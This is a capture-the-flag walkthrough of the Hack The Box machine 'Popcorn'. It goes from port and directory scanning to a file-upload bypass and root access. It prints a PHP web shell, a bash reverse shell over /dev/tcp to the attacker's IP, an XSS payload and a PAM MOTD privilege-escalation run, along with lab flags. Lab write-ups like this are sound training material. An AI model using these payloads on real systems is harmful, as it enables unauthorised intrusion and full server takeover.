# POPCORN

## NMAP

```bash
┌──(kali㉿kali)-[~/Downloads/hackthebox/popcorn]
└─$ nmap 10.10.10.6                   
Starting Nmap 7.91 ( https://nmap.org ) at 2021-10-20 02:18 EDT
Nmap scan report for 10.10.10.6
Host is up (0.29s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 51.60 seconds
                                                                                                          
┌──(kali㉿kali)-[~/Downloads/hackthebox/popcorn]
└─$ nmap 10.10.10.6 -p 22,80 -A
Starting Nmap 7.91 ( https://nmap.org ) at 2021-10-20 02:19 EDT
Nmap scan report for 10.10.10.6
Host is up (0.29s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 5.1p1 Debian 6ubuntu2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 3e:c8:1b:15:21:15:50:ec:6e:63:bc:c5:6b:80:7b:38 (DSA)
|_  2048 aa:1f:79:21:b8:42:f4:8a:38:bd:b8:05:ef:1a:07:4d (RSA)
80/tcp open  http    Apache httpd 2.2.12 ((Ubuntu))
|_http-server-header: Apache/2.2.12 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## WEBSITE

![](https://github.com/Leo-2807/Writeups/blob/main/images/popcorn1.png)

## GOBUSTER

```bash
┌──(kali㉿kali)-[~/Downloads/hackthebox/popcorn]
└─$ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.10.6 -q -t 100 -x php,html,txt,phtml
/index                (Status: 200) [Size: 177]
/index.html           (Status: 200) [Size: 177]
/test                 (Status: 200) [Size: 47032]
/test.php             (Status: 200) [Size: 47044]
/torrent              (Status: 301) [Size: 310] [--> http://10.10.10.6/torrent/]
/rename               (Status: 301) [Size: 309] [--> http://10.10.10.6/rename/] 
```

## TEST

![](https://github.com/Leo-2807/Writeups/blob/main/images/popcorn2.png)

## RENAME

![](https://github.com/Leo-2807/Writeups/blob/main/images/popcorn3.png)

## TORRENT

![](https://github.com/Leo-2807/Writeups/blob/main/images/popcorn4.png)

### GOBUSTER

```bash
┌──(kali㉿kali)-[~/Downloads/hackthebox/popcorn]
└─$ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.10.6/torrent/ -q -t 100 -x php,html,txt,phtml
/templates            (Status: 301) [Size: 320] [--> http://10.10.10.6/torrent/templates/]
/rss                  (Status: 200) [Size: 964]                                           
/rss.php              (Status: 200) [Size: 964]                                           
/login                (Status: 200) [Size: 8371]                                          
/login.php            (Status: 200) [Size: 8367]                                          
/index                (Status: 200) [Size: 11356]                                         
/index.php            (Status: 200) [Size: 11356]                                         
/download             (Status: 200) [Size: 0]                                             
/users                (Status: 301) [Size: 316] [--> http://10.10.10.6/torrent/users/]    
/download.php         (Status: 200) [Size: 0]                                             
/images               (Status: 301) [Size: 317] [--> http://10.10.10.6/torrent/images/]   
/admin                (Status: 301) [Size: 316] [--> http://10.10.10.6/torrent/admin/]    
/health               (Status: 301) [Size: 317] [--> http://10.10.10.6/torrent/health/]   
/browse               (Status: 200) [Size: 9278]                                          
/browse.php           (Status: 200) [Size: 9278]                                          
/upload               (Status: 301) [Size: 317] [--> http://10.10.10.6/torrent/upload/]   
/upload.php           (Status: 200) [Size: 8357]                                          
/comment              (Status: 200) [Size: 936]                                           
/comment.php          (Status: 200) [Size: 936]                                           
/css                  (Status: 301) [Size: 314] [--> http://10.10.10.6/torrent/css/]      
/edit                 (Status: 200) [Size: 0]                                             
/edit.php             (Status: 200) [Size: 0]                                             
/lib                  (Status: 301) [Size: 314] [--> http://10.10.10.6/torrent/lib/]      
/database             (Status: 301) [Size: 319] [--> http://10.10.10.6/torrent/database/] 
/secure               (Status: 200) [Size: 4]                                             
/secure.php           (Status: 200) [Size: 4]                                             
/js                   (Status: 301) [Size: 313] [--> http://10.10.10.6/torrent/js/]       
/logout               (Status: 200) [Size: 182]                                           
/logout.php           (Status: 200) [Size: 182]                                           
/preview              (Status: 200) [Size: 28104]                                         
/config               (Status: 200) [Size: 0]                                             
/config.php           (Status: 200) [Size: 0]                                             
/readme               (Status: 301) [Size: 317] [--> http://10.10.10.6/torrent/readme/]   
/thumbnail.php        (Status: 200) [Size: 1789]                                          
/thumbnail            (Status: 200) [Size: 1789]                                          
/validator            (Status: 200) [Size: 0]                                             
/validator.php        (Status: 200) [Size: 0]                                             
/hide                 (Status: 200) [Size: 3765]                                          
/PNG                  (Status: 301) [Size: 314] [--> http://10.10.10.6/torrent/PNG/] 
```

## EXPLOIT 

On doing a quick google search I found this [exploit](https://www.exploit-db.com/exploits/11746). 

```bash
======================      Exploit By El-Kahina       =================================
 # Exploit  : 
 
 1 - use tamper data :
 
 http://127.0.0.1/torrenthoster//torrents.php?mode=upload
 
 2- 
    <center>
   Powered by Torrent Hoster
        <br />
        <form enctype="multipart/form-data" action="http://127.0.0.1/torrenthoster/upload.php" id="form" method="post" onsubmit="a=document.getElementById('form').style;a.display='none';b=document.getElementById('part2').style;b.display='inline';" style="display: inline;">
        <strong>&#65533;&#65533;&#65533;&#65533; &#65533;&#65533;&#65533; &#65533;&#65533;&#65533;&#65533;&#65533; &#65533;&#65533; &#65533;&#65533;:</strong> <?php echo $maxfilesize; ?>&#65533;&#65533;&#65533;&#65533;&#65533;&#65533;&#65533;&#65533;<br />
<br>
        <input type="file" name="upfile" size="50" /><br />
<input type="submit" value="&#65533;&#65533;&#65533; &#65533;&#65533;&#65533;&#65533;&#65533;" id="upload" />
        </form>
        <div id="part2" style="display: none;">&#65533;&#65533;&#65533; &#65533;&#65533;&#65533; &#65533;&#65533;&#65533;&#65533;&#65533; .. &#65533;&#65533; &#65533;&#65533;&#65533;&#65533; &#65533;&#65533;&#65533;&#65533;&#65533;</div>
        </center>
        
3 - http://127.0.0.1/torrenthoster/torrents/  (to find shell)      
        
4 - Xss:

http://127.0.0.1/torrenthoster/users/forgot_password.php/>"><ScRiPt>alert(00213771818860)</ScRiPt>
       
==========================================
```

But to use this we need to be logged in. I tried searching for any default creds but couldn't find any. So I registered a new account and logged in using my creds.

Then I opened the upload page.

![](https://github.com/Leo-2807/Writeups/blob/main/images/popcorn5.png)

I tried a few things here and found that only a legit torrent file can be uploaded so I downloaded a sample torrent file and uploaded it.

![](https://github.com/Leo-2807/Writeups/blob/main/images/popcorn7.png)

## SHELL

On clicking on the `edit this torrent` button it opens a new browser window.

![](https://github.com/Leo-2807/Writeups/blob/main/images/popcorn8.png)

There is a update screenshot option where we can upload a image file.
I tried to upload php code for command execution.

```php
<?php system($_GET['cmd']); ?>
```

![](https://github.com/Leo-2807/Writeups/blob/main/images/popcorn9.png)

Now going to the `/torrent/upload` page I see that `test.php.jpg` file has been renamed to to some random value .jpg . Now we cannot execute the php code.

I tried a few different variations with burpsuite and found that as long as the `Content-type` is set to  `image/jpg` it dosen't matter what the extention or magic bytes are.

![](1https://github.com/Leo-2807/Writeups/blob/main/images/popcorn10.png)

I used burpsuite to intercept the request and changed the content type to `image/png`.

![](https://github.com/Leo-2807/Writeups/blob/main/images/popcorn11.png)

![](https://github.com/Leo-2807/Writeups/blob/main/images/popcorn12.png)

This time on opening the `/upload` directory the extension of file is .php.

![](https://github.com/Leo-2807/Writeups/blob/main/images/popcorn13.png)

Opening the file and adding `?cmd=whoami` to the url we get command execurion.

![](https://github.com/Leo-2807/Writeups/blob/main/images/popcorn14.png)

I used [cyberchef](https://gchq.github.io/CyberChef/) to urlencode the reverse shell `bash -c 'bash -i >& /dev/tcp/10.10.14.3/4444 0>&1'` and started a nc listner .

```bash
┌──(kali㉿kali)-[~/Downloads/hackthebox/popcorn]
└─$ nc -lvnp 4444              
listening on [any] 4444 ...
connect to [10.10.14.3] from (UNKNOWN) [10.10.10.6] 49517
bash: no job control in this shell
www-data@popcorn:/var/www/torrent/upload$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## USER.TXT

Turns out that user.txt in user george's home directory have read permission.

```bash
www-data@popcorn:/var/www/torrent$ ls -la /home/george
ls -la /home/george
total 868
drwxr-xr-x 3 george george   4096 Oct 26  2020 .
drwxr-xr-x 3 root   root     4096 Mar 17  2017 ..
lrwxrwxrwx 1 george george      9 Oct 26  2020 .bash_history -> /dev/null
-rw-r--r-- 1 george george    220 Mar 17  2017 .bash_logout
-rw-r--r-- 1 george george   3180 Mar 17  2017 .bashrc
drwxr-xr-x 2 george george   4096 Mar 17  2017 .cache
-rw------- 1 root   root     1571 Mar 17  2017 .mysql_history
-rw------- 1 root   root       19 May  5  2017 .nano_history
-rw-r--r-- 1 george george    675 Mar 17  2017 .profile
-rw-r--r-- 1 george george      0 Mar 17  2017 .sudo_as_admin_successful
-rw-r--r-- 1 george george 848727 Mar 17  2017 torrenthoster.zip
-rw-r--r-- 1 george george     33 Oct 19 14:49 user.txt
``` 

```bash
www-data@popcorn:/home/george$ cat user.txt
cat user.txt
6ceb22d915ac105ed29fc4c58091dae4
```

## ROOT.TXT

Enumerating the user george I found the file which I haven't seen before.

```bash
-rw-r--r-- 1 george george    0 Mar 17  2017 motd.legal-displayed
```

On doing a liitle google search I found this [exploit](https://www.exploit-db.com/exploits/14339).

I copied the exploit on my machine and started a http server using python. Then I used wget to transfer the file on to the target machine.

```bash
www-data@popcorn:/dev/shm$ ./exploit.sh
./exploit.sh
[*] Ubuntu PAM MOTD local root
[*] SSH key set up
[*] spawn ssh
[+] owned: /etc/passwd
[*] spawn ssh
[+] owned: /etc/shadow
[*] SSH key removed
[+] Success! Use password toor to get root
su: must be run from a terminal
```

We can solve this error by spawning a python shell.

```bash
www-data@popcorn:/dev/shm$ python -c 'import pty; pty.spawn("/bin/bash")'
python -c 'import pty; pty.spawn("/bin/bash")'
www-data@popcorn:/dev/shm$ ./exploit.sh
./exploit.sh
[*] Ubuntu PAM MOTD local root
[*] SSH key set up
[*] spawn ssh
[+] owned: /etc/passwd
[*] spawn ssh
[+] owned: /etc/shadow
[*] SSH key removed
[+] Success! Use password toor to get root
Password: toor

root@popcorn:/dev/shm# id
id
uid=0(root) gid=0(root) groups=0(root)
```

```bash
root@popcorn:/dev/shm# cd /root
cd /root
root@popcorn:~# ls
ls
root.txt
root@popcorn:~# cat root.txt
cat root.txt
b1860b0f97fb18a8dd42b95c97b62919
```